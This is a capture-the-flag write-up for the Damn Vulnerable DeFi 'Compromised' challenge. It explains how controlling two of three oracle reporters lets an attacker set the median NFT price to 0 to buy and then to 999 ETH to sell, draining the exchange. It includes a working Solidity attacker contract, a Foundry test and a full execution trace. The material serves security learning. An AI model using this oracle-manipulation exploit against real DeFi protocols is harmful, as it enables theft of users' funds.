# Compromised Challenge

## Challenge Overview:

A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at **999 ETH** each.

This price is fetched from an on-chain oracle, based on **three trusted sources** (reporters):
- `0x188Ea627E3531Db590e6f1D71ED83628d1933088`
- `0xA417D473c40a4d42BAd35f147c21eEa7973539D8`
- `0xab3600bF153A316dE44827e2473056d56B774a40`

Starting with just **0.1 ETH**, the goal is to:
- Drain all **999 ETH** from the `Exchange` contract
- Send it to the designated `recovery` address

---

## Vulnerability Explanation:

The price of the NFT (`DVNFT`) is determined by the **median value** submitted by the three trusted oracles. If an attacker controls or compromises **two of the three sources**, they can **fully control the median price**.

In this challenge, the two oracle addresses were compromised by leaked private keys encoded in the binary (in the real challenge). By simulating this compromise, we can:

1. Post a **very low price (0 ETH)** to buy the NFT for almost free
2. Post a **very high price (~999 ETH)** to sell it back and drain the exchange

This is a **classic oracle manipulation attack**.

---

## Vulnerable Code:

```solidity
// This function used to change the oracle price ,if more than half of the prices change then control the prices 
//@audit this function to restrict to change the prices
function postPrice(
        string calldata symbol,
        uint256 newPrice
    ) external onlyRole(TRUSTED_SOURCE_ROLE) {
        _setPrice(msg.sender, symbol, newPrice);
    }
    //calculate the median after changing the prices(this case we can change two prices using above functioon we can manipulate the prices)


```
Since there are only 3 sources, compromising any 2 of them gives full control over the oracle’s output.

### Exploit Strategy:

1. Use the compromised sources to post a price of 0 ETH

2. Call exchange.buyOne() to buy the NFT cheaply

3. Update the price via compromised sources to 999 ETH

4. Approve and sell the NFT back using exchange.sellOne()

5. Collect(Attacker contract)the ETH proceeds and send them to recovery
   
### Exploit Code:
```solidity
// test_compromised function 
 function test_compromised() public checkSolved {
        address source1 = sources[0];
        address source2 = sources[1];
        OracleAttacker oracleAttacker = new OracleAttacker{
            value: address(this).balance
        }(oracle, exchange, nft, recovery);

        vm.prank(source1);
        oracle.postPrice(symbols[0], 0);
        vm.prank(source2);
        oracle.postPrice(symbols[1], 0);

        oracleAttacker.buy(); //buy the NFT for 0 wei

        vm.prank(source1);
        oracle.postPrice(symbols[0], EXCHANGE_INITIAL_ETH_BALANCE);
        vm.prank(source2);
        oracle.postPrice(symbols[1], EXCHANGE_INITIAL_ETH_BALANCE);

        oracleAttacker.sell(); //sell the NFT
        oracleAttacker.recovery(EXCHANGE_INITIAL_ETH_BALANCE); //transfer all the balance to the recovery address
    }

    //Attacker contract to exploit
    contract OracleAttacker is IERC721Receiver {
    TrustfulOracle private oracle;
    Exchange private exchange;
    DamnValuableNFT private token;
    address Recovery;
    uint256 public nft_id;

    constructor(
        TrustfulOracle _oracle,
        Exchange _exchange,
        DamnValuableNFT _nft,
        address _recovery
    ) payable {
        oracle = _oracle;
        exchange = _exchange;
        token = _nft;
        Recovery = _recovery;
    }

    //buy and sell the NFT to hijack the tokens and send to the recovery account

    function buy() external payable {
        nft_id = exchange.buyOne{value: 1}(); //attacker contract buy the NFT for 0 wei
    }

    function sell() external {
        token.approve(address(exchange), nft_id);//transfer nft from this contract to exchange contract
        exchange.sellOne(nft_id);
    }

    function recovery(uint256 amount) external {
        payable(Recovery).transfer(amount); //transfer all the balance from this contract  to the recovery address
    }

    //used for  ERC721 tokens accepting in this contract 
    function onERC721Received(
        address /*operator*/,
        address /*from*/,
        uint256 /*tokenId*/,
        bytes calldata /*data*/
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

```

### Proof of Exploit:

1. Exchange’s ETH balance becomes 0

2. Recovery address receives 999 ETH

3. Player does not own any NFTs

4. NFT price is restored back to 999 ETH

```yaml
nithin@ScateR:~/SCATERLABs/CTFs/Dam-vulnerable-Defi$ forge test --match-test test_compromised -vvvv
[⠒] Compiling...
No files changed, compilation skipped
Ran 1 test for test/compromised/Compromised.t.sol:CompromisedChallenge
[PASS] test_compromised() (gas: 674881)
Traces:
  [765681] CompromisedChallenge::test_compromised()
    ├─ [396323] → new OracleAttacker@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 1531 bytes of code
    ├─ [0] VM::prank(0x188Ea627E3531Db590e6f1D71ED83628d1933088)
    │   └─ ← [Return]
    ├─ [11977] TrustfulOracle::postPrice("DVNFT", 0)
    │   ├─ emit UpdatedPrice(source: 0x188Ea627E3531Db590e6f1D71ED83628d1933088, symbol: 0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice: 999000000000000000000 [9.99e20], newPrice: 0)
    │   └─ ← [Stop]
    ├─ [0] VM::prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8)
    │   └─ ← [Return]
    ├─ [11977] TrustfulOracle::postPrice("DVNFT", 0)
    │   ├─ emit UpdatedPrice(source: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8, symbol: 0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice: 999000000000000000000 [9.99e20], newPrice: 0)
    │   └─ ← [Stop]
    ├─ [126851] OracleAttacker::buy()
    │   ├─ [114616] Exchange::buyOne{value: 1}()
    │   │   ├─ [3418] DamnValuableNFT::symbol() [staticcall]
    │   │   │   └─ ← [Return] "DVNFT"
    │   │   ├─ [16213] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [75167] DamnValuableNFT::safeMint(OracleAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: OracleAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], tokenId: 0)
    │   │   │   ├─ [1259] OracleAttacker::onERC721Received(Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 0x0000000000000000000000000000000000000000, 0, 0x)
    │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [55] OracleAttacker::receive{value: 1}()
    │   │   │   └─ ← [Stop]
    │   │   ├─ emit TokenBought(buyer: OracleAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], tokenId: 0, price: 0)
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [0] VM::prank(0x188Ea627E3531Db590e6f1D71ED83628d1933088)
    │   └─ ← [Return]
    ├─ [5177] TrustfulOracle::postPrice("DVNFT", 999000000000000000000 [9.99e20])
    │   ├─ emit UpdatedPrice(source: 0x188Ea627E3531Db590e6f1D71ED83628d1933088, symbol: 0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice: 0, newPrice: 999000000000000000000 [9.99e20])
    │   └─ ← [Stop]
    ├─ [0] VM::prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8)
    │   └─ ← [Return]
    ├─ [5177] TrustfulOracle::postPrice("DVNFT", 999000000000000000000 [9.99e20])
    │   ├─ emit UpdatedPrice(source: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8, symbol: 0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice: 0, newPrice: 999000000000000000000 [9.99e20])
    │   └─ ← [Stop]
    ├─ [88512] OracleAttacker::sell()
    │   ├─ [25464] DamnValuableNFT::approve(Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 0)
    │   │   ├─ emit Approval(owner: OracleAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], approved: Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], tokenId: 0)
    │   │   └─ ← [Stop]
    │   ├─ [61137] Exchange::sellOne(0)
    │   │   ├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]
    │   │   │   └─ ← [Return] OracleAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   │   ├─ [1332] DamnValuableNFT::getApproved(0) [staticcall]
    │   │   │   └─ ← [Return] Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]
    │   │   ├─ [1418] DamnValuableNFT::symbol() [staticcall]
    │   │   │   └─ ← [Return] "DVNFT"
    │   │   ├─ [6213] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]
    │   │   │   └─ ← [Return] 999000000000000000000 [9.99e20]
    │   │   ├─ [29511] DamnValuableNFT::transferFrom(OracleAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 0)
    │   │   │   ├─ emit Transfer(from: OracleAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], tokenId: 0)
    │   │   │   └─ ← [Stop]
    │   │   ├─ [4162] DamnValuableNFT::burn(0)
    │   │   │   ├─ emit Transfer(from: Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], to: 0x0000000000000000000000000000000000000000, tokenId: 0)
    │   │   │   └─ ← [Stop]
    │   │   ├─ [55] OracleAttacker::receive{value: 999000000000000000000}()
    │   │   │   └─ ← [Stop]
    │   │   ├─ emit TokenSold(seller: OracleAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], tokenId: 0, price: 999000000000000000000 [9.99e20])
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [34939] OracleAttacker::recovery(999000000000000000000 [9.99e20])
    │   ├─ [0] recovery::fallback{value: 999000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(999000000000000000000 [9.99e20], 999000000000000000000 [9.99e20]) [staticcall]
    │   └─ ← [Return]
    ├─ [2954] DamnValuableNFT::balanceOf(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [6213] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]
    │   └─ ← [Return] 999000000000000000000 [9.99e20]
    ├─ [0] VM::assertEq(999000000000000000000 [9.99e20], 999000000000000000000 [9.99e20]) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.35ms (1.85ms CPU time)

Ran 1 test suite in 27.58ms (5.35ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

***For more info  this challenge visit Github***:  [Visit](https://github.com/SCATERLABs/CTFs/tree/5cba1e510839decccec214d3d6cc179ca6d1d131/Dam-vulnerable-Defi)